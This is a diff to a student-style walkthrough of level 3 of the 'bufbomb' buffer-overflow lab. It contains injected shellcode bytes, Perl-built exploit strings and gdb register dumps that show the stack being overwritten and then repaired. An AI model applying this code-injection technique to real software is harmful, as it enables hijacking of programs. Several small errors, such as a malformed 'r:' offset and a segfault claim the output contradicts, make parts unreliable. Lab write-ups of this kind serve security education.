@@ -197,12 +197,13 @@ Disassembly of section .text:
 00000000 <.text>:
    0:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
    5:   68 93 8c 04 08          push   $0x8048c93
+   a:   c3                      ret
 ```
 
 Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:
 
 ```
-unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d 68 93 8c 04 08"' > hexlevel3
+unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d 68 93 8c 04 08 c3"' > hexlevel3
 ```
 
 "58 33 68 55 " is the little endian address of where our exploit resides on the stack from level 2. When we inject the exploit onto the stack, this address will be what the eip points to after returning from getbuf().
@@ -211,13 +212,66 @@ Now type:
 ```
 unix> ./hex2raw < hexlevel3 > raw
 unix> gdb bufbomb
-(gdb) break *test+3
-(gdb) run -u quinnliu
+(gdb) break *test+20
+(gdb) run -u quinnliu < raw
 (gdb) i r
 ```
 
 Gives you:
 ```
+(gdb) i r
+eax            0x2d8cc70c       764200716
+ecx            0xa      10
+edx            0xbe4334 12469044
+ebx            0x0      0
+esp            0x55683358       0x55683358
+ebp            0xdddddddd       0xdddddddd
+esi            0x55686018       1432903704
+edi            0xc60    3168
+eip            0x8048c93        0x8048c93 <test+20>
+eflags         0x212    [ AF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+```
+
+As you can see %eax has been successfully overwritten with the hexadecimal representation of the cookie "quinnliu".
+But if you notice the base stack pointer %ebp has also been overwritten with the exploit, which will lead to an unsuccessful exploitation of the bufbomb binary.
+
+After typing ```cont```
+
+You get:
+```
+(gdb) cont
+Continuing.
+Type string:Sabotaged!: the stack has been corrupted
+Better luck next time
+
+Program exited normally.
+```
+
+So the exploit did succesfully return from getbuf() with the "quinnliu" cookie instead of the value 1. But the corrupted stack caused %ebp to be overwritten which led to a segfault. To fix this, instead of just pushing the return address and return with the "quinnliu" cookie, %ebp needs to be replaced with the original %ebp value so bufbomb can continue on without any segfaults.
+
+Let's run bufbomb again and see what %ebp looks like before the exploit corrupts the stack.
+
+Type after quiting our of gdb:
+```
+unix> gdb bufbomb
+(gdb) break *test+3
+(gdb) run -u quinnliu
+```
+
+Gives you:
+```
+(gdb) run -u quinnliu
+Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -u quinnliu
+Userid: quinnliu
+Cookie: 0x2d8cc70c
+
+Breakpoint 1, 0x08048c82 in test ()
 (gdb) i r
 eax            0xc      12
 ecx            0x55683370       1432892272
@@ -237,7 +291,8 @@ fs             0x0      0
 gs             0x63     99
 ```
 
-We can see that %ebp is 0x55683380 before the exploit corrupts the stack. To successfully exploti bufbomb we will have to mov this onto %ebp similar to when we pushed the hex cookie of quinnliu into %eax.
+Prior to the exploit being ran %ebp holds the address 
+0x55683380.  To successfully exploti bufbomb we will have to mov this onto %ebp similar to when we pushed the hex cookie of quinnliu into %eax.
 
 This means our "assemblylevel3.s" with this fix will look like:
 ```
@@ -266,12 +321,13 @@ Disassembly of section .text:
    0:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
    5:   bd 80 33 68 55          mov    $0x55683380,%ebp
    a:   68 93 8c 04 08          push   $0x8048c93
+   r:   c3                      ret
 ```
 
 Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:
 
 ```
-unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d bd 80 33 68 55 68 93 8c 04 08" ' > hexlevel3_2
+unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d bd 80 33 68 55 68 93 8c 04 08 c3" ' > hexlevel3_2
 ```
 
 Now type:
@@ -284,12 +340,15 @@ unix> gdb bufbomb
 Gives you:
 ```
 (gdb) run -u quinnliu < raw
+(gdb) run -u quinnliu < raw
 Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -u quinnliu < raw
 Userid: quinnliu
 Cookie: 0x2d8cc70c
+Type string:Boom!: getbuf returned 0x2d8cc70c
+VALID
+NICE JOB!
 
-Program received signal SIGSEGV, Segmentation fault.
-0x98316855 in ?? ()
+Program exited normally.
 Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
 ```
 
